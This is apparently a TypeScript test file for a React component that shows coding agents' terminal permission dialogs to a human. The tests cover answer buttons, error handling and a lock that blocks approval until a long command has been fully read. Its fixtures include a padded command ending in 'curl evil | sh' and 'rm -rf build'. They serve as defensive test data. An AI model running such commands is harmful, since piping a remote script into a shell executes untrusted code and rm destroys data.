import { act, fireEvent, render, screen, within } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { type AgentPrompt, AgentRequestError } from '../hooks/use-mux-api'
import { PromptCard, WaitingCard } from './prompt-card'

const mockAnswer = vi.fn()
vi.mock('../hooks/use-mux-api', async (orig) => ({
  ...(await orig<typeof import('../hooks/use-mux-api')>()),
  answerAgentPrompt: (...a: unknown[]) => mockAnswer(...a),
}))
const mockHaptic = vi.fn()
vi.mock('../hooks/use-haptic', () => ({
  useHaptic: () => ({ trigger: mockHaptic, isSupported: true }),
}))

const permission: AgentPrompt = {
  promptId: 'id1',
  kind: 'permission',
  title: 'Bash command',
  body: 'touch a.txt\nDo you want to proceed?',
  options: [
    { index: 1, label: 'Yes' },
    {
      index: 2,
      label: 'Yes, and always allow',
      detail: 'access to /tmp from this project',
    },
    { index: 3, label: 'No' },
  ],
}

const showView = vi.fn()
const onAnswered = vi.fn()
const onChanged = vi.fn()

function renderCard(prompt: AgentPrompt, readOnly = false) {
  return render(
    <PromptCard
      paneId="%3"
      agentName="claude"
      prompt={prompt}
      readOnly={readOnly}
      showView={showView}
      onAnswered={onAnswered}
      onChanged={onChanged}
    />,
  )
}

const click = async (name: string | RegExp) => {
  await act(async () => {
    fireEvent.click(screen.getByRole('button', { name }))
  })
}

beforeEach(() => {
  vi.clearAllMocks()
  mockAnswer.mockResolvedValue(undefined)
})

describe('PromptCard', () => {
  it('shows the dialog with a button per option, labelled for screen readers', () => {
    renderCard(permission)
    const card = screen.getByRole('alertdialog', { name: 'Bash command' })
    expect(card).toHaveAccessibleDescription(
      /touch a\.txt\s+Do you want to proceed\?/,
    )
    expect(
      screen.getByRole('button', { name: /1\.\s*Yes$/ }),
    ).toBeInTheDocument()
    expect(
      screen.getByText('access to /tmp from this project'),
    ).toBeInTheDocument()
    // A refusing option is marked as such
    expect(screen.getByRole('button', { name: /3\.\s*No/ })).toHaveClass(
      'text-danger',
    )
    expect(screen.getByRole('button', { name: /1\.\s*Yes$/ })).not.toHaveClass(
      'text-danger',
    )
  })

  it('answers an option, then asks for a fresh poll with a light buzz', async () => {
    renderCard(permission)
    await click(/2\.\s*Yes, and always/)
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id1', 2)
    expect(mockHaptic).toHaveBeenCalledWith('light')
    expect(onAnswered).toHaveBeenCalled()
  })

  it('Cancel sends Esc', async () => {
    renderCard(permission)
    await click('Cancel (Esc)')
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id1', 'cancel')
  })

  it('locks the buttons while answering', async () => {
    let resolve!: () => void
    mockAnswer.mockImplementation(
      () =>
        new Promise<void>((r) => {
          resolve = r
        }),
    )
    renderCard(permission)
    await click(/1\.\s*Yes$/)
    expect(screen.getByRole('button', { name: /3\.\s*No/ })).toBeDisabled()
    expect(screen.getByRole('button', { name: 'Cancel (Esc)' })).toBeDisabled()
    await act(async () => resolve())
    expect(screen.getByRole('button', { name: /3\.\s*No/ })).not.toBeDisabled()
  })

  it('a changed screen replaces the card and says why', async () => {
    const next = { ...permission, promptId: 'id2', body: 'rm -rf build' }
    mockAnswer.mockRejectedValue(
      new AgentRequestError(409, 'prompt_changed', 'x', undefined, next),
    )
    renderCard(permission)
    await click(/1\.\s*Yes$/)
    expect(onChanged).toHaveBeenCalledWith(next)
    expect(
      screen.getByText('The screen changed; check the dialog again.'),
    ).toBeInTheDocument()
    expect(onAnswered).not.toHaveBeenCalled()
  })

  it('a changed screen with no dialog left clears the card', async () => {
    mockAnswer.mockRejectedValue(
      new AgentRequestError(409, 'prompt_changed', 'x'),
    )
    renderCard(permission)
    await click(/1\.\s*Yes$/)
    expect(onChanged).toHaveBeenCalledWith(null)
  })

  it('an id already used (another device answered) polls again', async () => {
    mockAnswer.mockRejectedValue(
      new AgentRequestError(409, 'prompt_expired', 'x'),
    )
    renderCard(permission)
    await click(/1\.\s*Yes$/)
    expect(
      screen.getByText('This dialog was already answered.'),
    ).toBeInTheDocument()
    expect(onAnswered).toHaveBeenCalled()
  })

  it.each([
    [
      new AgentRequestError(
        502,
        'answer_not_confirmed',
        'the key was sent but the dialog is still open',
      ),
      'The answer was sent but the dialog is still open; check it in the terminal.',
    ],
    [
      new TypeError('Failed to fetch'),
      'Could not confirm the answer; check the dialog.',
    ],
  ])('other failures say so (%s)', async (err, shown) => {
    mockAnswer.mockRejectedValue(err)
    renderCard(permission)
    await click(/1\.\s*Yes$/)
    expect(screen.getByText(shown)).toBeInTheDocument()
  })

  it('every card has the way to the terminal', () => {
    renderCard(permission)
    fireEvent.click(screen.getByRole('button', { name: 'Open terminal' }))
    expect(showView).toHaveBeenCalledWith('terminal')
  })

  it('an unsupported dialog shows its content and only the terminal', () => {
    renderCard({
      kind: 'unsupported',
      title: '←  ☐ Size  ☐ Drink  ✔ Submit  →',
      body: 'What size?',
    })
    expect(screen.getByText('What size?')).toBeInTheDocument()
    expect(
      screen.getByText('Answer this dialog in the terminal.'),
    ).toBeInTheDocument()
    expect(screen.getAllByRole('button').map((b) => b.textContent)).toEqual([
      'Open terminal',
    ])
  })

  it('after its own answer, the same dialog without an id says the answer was sent', async () => {
    const { rerender } = renderCard(permission)
    await click(/1\.\s*Yes$/)
    rerender(
      <PromptCard
        paneId="%3"
        prompt={{ ...permission, promptId: undefined }}
        showView={showView}
        onAnswered={onAnswered}
        onChanged={onChanged}
      />,
    )
    expect(screen.getByText('Answer sent…')).toBeInTheDocument()
  })

  it('failures read the dialog again', async () => {
    mockAnswer.mockRejectedValue(new TypeError('Failed to fetch'))
    renderCard(permission)
    await click(/1\.\s*Yes$/)
    expect(onAnswered).toHaveBeenCalled()
  })

  it('option buttons grow with their content (no fixed 44px height)', () => {
    renderCard(permission)
    const b = screen.getByRole('button', { name: /2\.\s*Yes, and always/ })
    expect(b).toHaveClass('pointer-coarse:min-h-touch')
    expect(b.className).not.toMatch(/(^|\s)(pointer-coarse:)?h-(9|touch)(\s|$)/)
  })

  it('a dialog whose id was just used waits without buttons', () => {
    renderCard({ ...permission, promptId: undefined })
    // Not this card's answer: just waiting
    expect(screen.getByText('Waiting for Claude Code…')).toBeInTheDocument()
    expect(screen.queryByRole('button', { name: /Yes/ })).toBeNull()
  })

  it("waits for the pane's agent by name", () => {
    render(
      <PromptCard
        paneId="%3"
        agentName="codex"
        prompt={{ ...permission, promptId: undefined }}
        showView={showView}
        onAnswered={onAnswered}
        onChanged={onChanged}
      />,
    )
    expect(screen.getByText('Waiting for Codex…')).toBeInTheDocument()
  })

  it('view-only shows the dialog, with no button at all', () => {
    renderCard(permission, true)
    expect(
      screen.getByRole('region', { name: 'Bash command' }),
    ).toBeInTheDocument()
    expect(screen.queryByRole('button')).toBeNull()
    expect(screen.queryByText('Answer sent…')).toBeNull()
  })

  it('a dialog without a title or body still reads', () => {
    renderCard({ kind: 'unsupported', title: '' }, true)
    expect(
      screen.getByRole('region', { name: 'Claude Code is asking' }),
    ).not.toHaveAttribute('aria-describedby')
  })
})

describe('PromptCard with several questions', () => {
  const tab: AgentPrompt = {
    promptId: 'id2',
    kind: 'select',
    title: 'Which drink do you prefer?',
    options: [
      { index: 1, label: 'Tea' },
      { index: 2, label: 'Coffee' },
      { index: 4, label: 'Chat about this' },
    ],
    steps: [
      { label: 'Size', answered: true },
      { label: 'Drink', current: true },
      { label: 'Submit' },
    ],
  }

  it('shows the tabs as steps, the open one current', () => {
    renderCard(tab)
    const steps = screen.getByRole('list', { name: 'Questions' })
    const items = Array.from(steps.querySelectorAll('li'))
    expect(items.map((li) => li.textContent)).toEqual([
      '✓Size (answered)',
      'Drink',
      'Submit',
    ])
    expect(items[1]).toHaveAttribute('aria-current', 'step')
    expect(items[0]).not.toHaveAttribute('aria-current')
  })

  it('answers the open tab with its digit, Chat about this included', async () => {
    renderCard(tab)
    await click(/4\.\s*Chat about this/)
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id2', 4)
    expect(onAnswered).toHaveBeenCalled()
  })

  it('another step is a button that opens that tab; the open one is not', async () => {
    renderCard(tab)
    const steps = screen.getByRole('list', { name: 'Questions' })
    expect(within(steps).queryByRole('button', { name: 'Drink' })).toBeNull()
    await act(async () => {
      fireEvent.click(
        within(steps).getByRole('button', { name: /Size \(answered\)/ }),
      )
    })
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id2', { step: 0 })
    await act(async () => {
      fireEvent.click(within(steps).getByRole('button', { name: 'Submit' }))
    })
    expect(mockAnswer).toHaveBeenLastCalledWith('%3', 'id2', { step: 2 })
  })

  it('steps are not buttons without an answerable card', () => {
    renderCard(tab, true)
    expect(
      within(screen.getByRole('list', { name: 'Questions' })).queryAllByRole(
        'button',
      ),
    ).toHaveLength(0)
  })

  it('a multiSelect tab toggles options and moves on with Next', async () => {
    renderCard({
      promptId: 'id3',
      kind: 'multiselect',
      title: 'Which extras would you like?',
      options: [
        { index: 1, label: 'Sugar' },
        { index: 2, label: 'Milk', checked: true },
        { index: 4, label: 'Chat about this' },
      ],
      steps: [{ label: 'Extras', current: true }, { label: 'Submit' }],
    })
    expect(screen.getByRole('button', { name: /1\.\s*Sugar/ })).toHaveAttribute(
      'aria-pressed',
      'false',
    )
    expect(screen.getByRole('button', { name: /2\.\s*Milk/ })).toHaveAttribute(
      'aria-pressed',
      'true',
    )
    // Chat about this is not an option to tick
    expect(
      screen.getByRole('button', { name: /4\.\s*Chat about this/ }),
    ).not.toHaveAttribute('aria-pressed')
    await click(/1\.\s*Sugar/)
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id3', 1)
    await click('Next')
    expect(mockAnswer).toHaveBeenLastCalledWith('%3', 'id3', 'next')
  })

  it('a toggle keeps the focus once sent', async () => {
    renderCard({
      promptId: 'id3',
      kind: 'multiselect',
      title: 'Which extras would you like?',
      options: [
        { index: 1, label: 'Sugar' },
        { index: 2, label: 'Milk' },
      ],
      steps: [{ label: 'Extras', current: true }, { label: 'Submit' }],
    })
    const sugar = screen.getByRole('button', { name: /1\.\s*Sugar/ })
    sugar.focus()
    await click(/1\.\s*Sugar/)
    expect(sugar).toHaveFocus()
  })

  it('a tab that did not open says so and shows the dialog on screen', async () => {
    const now = { ...tab, promptId: 'id9' }
    mockAnswer.mockRejectedValueOnce(
      new AgentRequestError(502, 'step_not_confirmed', 'x', undefined, now),
    )
    renderCard(tab)
    await act(async () => {
      fireEvent.click(
        within(screen.getByRole('list', { name: 'Questions' })).getByRole(
          'button',
          { name: 'Submit' },
        ),
      )
    })
    expect(
      screen.getByText('That tab did not open; check the dialog.'),
    ).toBeInTheDocument()
    expect(onChanged).toHaveBeenCalledWith(now)
    // No dialog left on screen clears the card
    mockAnswer.mockRejectedValueOnce(
      new AgentRequestError(502, 'step_not_confirmed', 'x'),
    )
    await act(async () => {
      fireEvent.click(
        within(screen.getByRole('list', { name: 'Questions' })).getByRole(
          'button',
          { name: 'Submit' },
        ),
      )
    })
    expect(onChanged).toHaveBeenLastCalledWith(null)
  })

  it('a single-choice tab has no Next and no pressed state', () => {
    renderCard(tab)
    expect(screen.queryByRole('button', { name: 'Next' })).toBeNull()
    expect(
      screen.getByRole('button', { name: /1\.\s*Tea/ }),
    ).not.toHaveAttribute('aria-pressed')
  })

  it('a single question has no steps', () => {
    renderCard(permission)
    expect(screen.queryByRole('list', { name: 'Questions' })).toBeNull()
  })
})

describe('PromptCard free-text answer', () => {
  const question: AgentPrompt = {
    promptId: 'id3',
    kind: 'select',
    title: 'Color Theme',
    body: 'Which color theme do you prefer?',
    options: [
      { index: 1, label: 'Red' },
      { index: 2, label: 'Blue' },
      { index: 4, label: 'Chat about this' },
    ],
    freeText: { index: 3, label: 'Type something.' },
  }
  const field = () => screen.getByRole('textbox', { name: 'Your answer' })
  const type = (value: string) =>
    fireEvent.change(field(), { target: { value } })
  const open = async () => {
    renderCard(question)
    await click(/3\.\s*Other…/)
  }

  it('offers Other… only on an answerable card with a free-text option', () => {
    const { unmount } = renderCard(question)
    expect(
      screen.getByRole('button', { name: /3\.\s*Other…/ }),
    ).toBeInTheDocument()
    unmount()
    const { unmount: u2 } = renderCard(question, true)
    expect(screen.queryByRole('button', { name: /Other…/ })).toBeNull()
    u2()
    renderCard({ ...question, freeText: undefined })
    expect(screen.queryByRole('button', { name: /Other…/ })).toBeNull()
  })

  it('opens a field, focused, and sends the text typed', async () => {
    await open()
    expect(field()).toHaveFocus()
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
    type('   ')
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
    type('Tím nhạt')
    await click('Send')
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id3', { text: 'Tím nhạt' })
    expect(onAnswered).toHaveBeenCalled()
    // Sent: the field closes
    expect(screen.queryByRole('textbox')).toBeNull()
  })

  it('Enter in the field sends; an empty one sends nothing', async () => {
    await open()
    await act(async () => {
      fireEvent.submit(field())
    })
    expect(mockAnswer).not.toHaveBeenCalled()
    type('Purple')
    await act(async () => {
      fireEvent.submit(field())
    })
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id3', { text: 'Purple' })
  })

  it('Cancel closes the field without sending anything', async () => {
    await open()
    type('Purple')
    await click('Cancel')
    expect(screen.queryByRole('textbox')).toBeNull()
    expect(mockAnswer).not.toHaveBeenCalled()
    // Reopened, it starts empty
    await click(/3\.\s*Other…/)
    expect(field()).toHaveValue('')
  })

  it('text over the limit is refused before sending', async () => {
    await open()
    type('ạ'.repeat(342)) // 3 bytes each
    expect(field()).toHaveAttribute('aria-invalid', 'true')
    expect(field()).toHaveAccessibleDescription(/limit is 1024 bytes/)
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
    await act(async () => {
      fireEvent.submit(field())
    })
    expect(mockAnswer).not.toHaveBeenCalled()
  })

  it('a refused text keeps the field to fix it', async () => {
    await open()
    type('a\tb')
    mockAnswer.mockRejectedValueOnce(
      new AgentRequestError(400, 'invalid_text', 'control'),
    )
    await click('Send')
    expect(
      screen.getByText(
        'The answer cannot hold line breaks or control characters.',
      ),
    ).toBeInTheDocument()
    expect(field()).toHaveValue('a\tb')
    expect(onAnswered).not.toHaveBeenCalled()
    mockAnswer.mockRejectedValueOnce(
      new AgentRequestError(413, 'text_too_long', 'long', 512),
    )
    await click('Send')
    expect(
      screen.getByText('The answer is too long: the limit is 512 bytes.'),
    ).toBeInTheDocument()
    mockAnswer.mockRejectedValueOnce(
      new AgentRequestError(413, 'text_too_long', 'long'),
    )
    await click('Send')
    expect(
      screen.getByText('The answer is too long: the limit is 1024 bytes.'),
    ).toBeInTheDocument()
    // Cancel clears the notice with the field
    await click('Cancel')
    expect(screen.queryByText(/too long/)).toBeNull()
  })

  it('text that did not show says to check the terminal', async () => {
    await open()
    type('Purple')
    mockAnswer.mockRejectedValueOnce(
      new AgentRequestError(502, 'text_not_confirmed', 'no'),
    )
    await click('Send')
    expect(
      screen.getByText(
        'The text may be in the dialog but was not sent; check it in the terminal.',
      ),
    ).toBeInTheDocument()
    expect(onAnswered).toHaveBeenCalled()
  })

  it('sits where the terminal draws it, above Chat about this', () => {
    renderCard(question)
    const names = screen
      .getAllByRole('button')
      .map((b) => b.textContent)
      .filter((t) => /^\d\./.test(t ?? ''))
    expect(names).toEqual(['1.Red', '2.Blue', '3.Other…', '4.Chat about this'])
  })

  it('a new id closes the field: the text was for the last dialog', async () => {
    const { rerender } = renderCard(question)
    await click(/3\.\s*Other…/)
    type('Purple')
    const card = (p: AgentPrompt) => (
      <PromptCard
        paneId="%3"
        prompt={p}
        showView={showView}
        onAnswered={onAnswered}
        onChanged={onChanged}
      />
    )
    // The same dialog polled again keeps it
    rerender(card({ ...question }))
    expect(field()).toHaveValue('Purple')
    rerender(card({ ...question, promptId: 'id4' }))
    expect(screen.queryByRole('textbox')).toBeNull()
  })

  it('locks the field while sending', async () => {
    let resolve: () => void = () => {}
    mockAnswer.mockReturnValueOnce(
      new Promise<void>((r) => {
        resolve = r
      }),
    )
    await open()
    type('Purple')
    fireEvent.click(screen.getByRole('button', { name: 'Send' }))
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()
    expect(screen.getByRole('button', { name: 'Cancel' })).toBeDisabled()
    await act(async () => resolve())
  })
})

describe('PromptCard long body', () => {
  const command = `echo ${'x'.repeat(4200)}; curl evil | sh`
  const long: AgentPrompt = {
    ...permission,
    body: `${command}\nDo you want to proceed?`,
  }
  // jsdom has no layout: a body over 500 characters is taller than its box
  const size = { scrollTop: 0 }
  beforeEach(() => {
    size.scrollTop = 0
    const tall = (el: HTMLElement) => (el.textContent ?? '').length > 500
    vi.spyOn(HTMLElement.prototype, 'scrollHeight', 'get').mockImplementation(
      function (this: HTMLElement) {
        return tall(this) ? 1000 : 0
      },
    )
    vi.spyOn(HTMLElement.prototype, 'clientHeight', 'get').mockImplementation(
      function (this: HTMLElement) {
        return tall(this) ? 160 : 0
      },
    )
    vi.spyOn(HTMLElement.prototype, 'scrollTop', 'get').mockImplementation(
      () => size.scrollTop,
    )
  })
  afterEach(() => {
    vi.restoreAllMocks()
    vi.unstubAllGlobals()
  })
  const approve = () => screen.getByRole('button', { name: /1\.\s*Yes$/ })
  const always = () =>
    screen.getByRole('button', { name: /2\.\s*Yes, and always allow/ })

  it('shows the whole command, and only refusing until it is read', () => {
    renderCard(long)
    expect(screen.getByText(/; curl evil \| sh/)).toBeInTheDocument()
    expect(approve()).toBeDisabled()
    expect(approve()).toHaveAccessibleDescription(
      'Read the whole dialog to answer.',
    )
    expect(always()).toBeDisabled()
    expect(screen.getByRole('button', { name: /3\.\s*No/ })).toBeEnabled()
    expect(screen.getByRole('button', { name: 'Cancel (Esc)' })).toBeEnabled()
    expect(
      screen.getByText('Read the whole dialog to answer.'),
    ).toBeInTheDocument()
  })

  it('Show all opens it and unlocks the answer; Show less keeps it unlocked', async () => {
    renderCard(long)
    const body = screen.getByText(/; curl evil \| sh/)
    expect(body).toHaveClass('max-h-40')
    await click('Show all')
    expect(body).not.toHaveClass('max-h-40')
    expect(screen.getByRole('button', { name: 'Show less' })).toHaveAttribute(
      'aria-expanded',
      'true',
    )
    expect(approve()).toBeEnabled()
    expect(
      screen.queryByText('Read the whole dialog to answer.'),
    ).not.toBeInTheDocument()
    await click('Show less')
    expect(body).toHaveClass('max-h-40')
    expect(approve()).toBeEnabled()
    await click(/1\.\s*Yes$/)
    expect(mockAnswer).toHaveBeenCalledWith('%3', 'id1', 1)
  })

  it('another long dialog in the same card is locked again', async () => {
    const { rerender } = renderCard(long)
    await click('Show all')
    expect(approve()).toBeEnabled()
    rerender(
      <PromptCard
        paneId="%3"
        agentName="claude"
        prompt={{ ...long, promptId: 'id2', body: `rm ${'y'.repeat(600)}` }}
        showView={showView}
        onAnswered={onAnswered}
        onChanged={onChanged}
      />,
    )
    expect(approve()).toBeDisabled()
    expect(screen.getByRole('button', { name: 'Show all' })).toBeInTheDocument()
  })

  it('scrolled to its end, the command is read', () => {
    renderCard(long)
    const body = screen.getByText(/; curl evil \| sh/)
    size.scrollTop = 400
    fireEvent.scroll(body)
    expect(approve()).toBeDisabled()
    size.scrollTop = 840
    act(() => {
      fireEvent.scroll(body)
    })
    expect(approve()).toBeEnabled()
  })

  it('a body that grows past its box is measured again', () => {
    let resized = () => {}
    vi.stubGlobal(
      'ResizeObserver',
      class {
        constructor(cb: () => void) {
          resized = cb
        }
        observe() {}
        disconnect() {}
      },
    )
    const { rerender } = renderCard(permission)
    expect(approve()).toBeEnabled()
    // The same body, its box narrower: it now overflows
    const body = screen.getByText(/touch a\.txt/)
    Object.defineProperty(body, 'scrollHeight', { value: 1000 })
    Object.defineProperty(body, 'clientHeight', { value: 160 })
    act(() => resized())
    expect(approve()).toBeDisabled()
    // Another dialog is read from its start
    rerender(
      <PromptCard
        paneId="%3"
        prompt={{ ...permission, body: 'ls' }}
        showView={showView}
        onAnswered={onAnswered}
        onChanged={onChanged}
      />,
    )
    expect(approve()).toBeEnabled()
  })

  it('a question is not locked, and a read-only card still opens', async () => {
    renderCard({
      promptId: 'q1',
      kind: 'select',
      title: 'Theme',
      body: 'x'.repeat(600),
      options: [{ index: 1, label: 'Red' }],
    })
    expect(screen.getByRole('button', { name: /1\.\s*Red/ })).toBeEnabled()
    expect(
      screen.queryByText('Read the whole dialog to answer.'),
    ).not.toBeInTheDocument()
    expect(screen.getByRole('button', { name: 'Show all' })).toBeInTheDocument()
  })

  it('a long option detail is shown whole', () => {
    const detail = `access to /${'d'.repeat(400)}/etc`
    renderCard({
      ...permission,
      options: [{ index: 1, label: 'Yes, and always allow', detail }],
    })
    expect(screen.getByText(detail)).toHaveClass('break-words')
  })
})

describe('WaitingCard', () => {
  it('points to the terminal', () => {
    render(<WaitingCard agentName="claude" showView={showView} />)
    expect(
      screen.getByText('Claude Code is waiting for you in the terminal.'),
    ).toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: 'Open terminal' }))
    expect(showView).toHaveBeenCalledWith('terminal')
  })

  it("names the pane's agent", () => {
    render(<WaitingCard agentName="codex" showView={showView} />)
    expect(
      screen.getByText('Codex is waiting for you in the terminal.'),
    ).toBeInTheDocument()
  })
})
